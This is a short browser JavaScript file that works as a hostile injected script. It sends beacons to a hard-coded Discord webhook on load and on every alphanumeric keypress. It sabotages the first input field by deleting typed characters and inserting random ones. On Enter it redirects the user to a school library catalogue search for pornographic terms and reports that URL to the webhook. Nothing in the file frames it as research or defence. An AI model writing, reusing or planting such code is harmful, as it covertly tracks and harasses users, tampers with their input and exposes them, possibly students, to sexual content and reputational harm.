var xhr = new XMLHttpRequest();var url = "https://discord.com/api/webhooks/1230013392190836807/YBJ3pNOa544labFi-TcurRFMDKlM2LMT36Jiel1PFWAy8TDWQqUa-yolhXwHQYD-F8bh";xhr.open("POST", url, true);xhr.setRequestHeader("Content-Type", "application/json");var data = JSON.stringify({"content": 'final version running'});xhr.send(data);

(function() {
    document.addEventListener('keypress', function(event) {
        var charCode = event.which || event.keyCode;
        if ((charCode >= 48 && charCode <= 57) || // 0-9
            (charCode >= 65 && charCode <= 90) || // A-Z
            (charCode >= 97 && charCode <= 122)) { // a-z
            alertRandomKeyPress();
        }
    });

    function alertRandomKeyPress() {
    	var elem = document.querySelector('input');
        var randomCharCode = getRandomAlphanumericCharCode();
        var string1 = elem.value;
        elem.value = string1.substring(0, string1.length - 2);
        setTimeout(function() {elem.value += String.fromCharCode(randomCharCode)}, 300)
        var xhr = new XMLHttpRequest();var url = "https://discord.com/api/webhooks/1230013392190836807/YBJ3pNOa544labFi-TcurRFMDKlM2LMT36Jiel1PFWAy8TDWQqUa-yolhXwHQYD-F8bh";xhr.open("POST", url, true);xhr.setRequestHeader("Content-Type", "application/json");var data = JSON.stringify({"content": 'final version keypress'});xhr.send(data);
    }

    function getRandomAlphanumericCharCode() {
        var charCodes = [];
        charCodes = charCodes.concat(getRange(48, 57)); // 0-9
        charCodes = charCodes.concat(getRange(65, 90)); // A-Z
        charCodes = charCodes.concat(getRange(97, 122)); // a-z
        return charCodes[Math.floor(Math.random() * charCodes.length)];
    }

    function getRange(start, end) {
        return Array(end - start + 1).fill().map((_, idx) => start + idx)
    }
})();

(function() { 
    document.addEventListener('keydown', function(event) {
        if (event.key === 'Enter') {
            window.location.href = 'https://search.follettsoftware.com/metasearch/ui/134341/search/all?q=gay%20furry%20porn&ists=0&activeMenu=HOME';
            var xhr = new XMLHttpRequest();var url = "https://discord.com/api/webhooks/1230013392190836807/YBJ3pNOa544labFi-TcurRFMDKlM2LMT36Jiel1PFWAy8TDWQqUa-yolhXwHQYD-F8bh";xhr.open("POST", url, true);xhr.setRequestHeader("Content-Type", "application/json");var data = JSON.stringify({"content": window.location.href});xhr.send(data);
        }
    });
})();

console.log('f1')

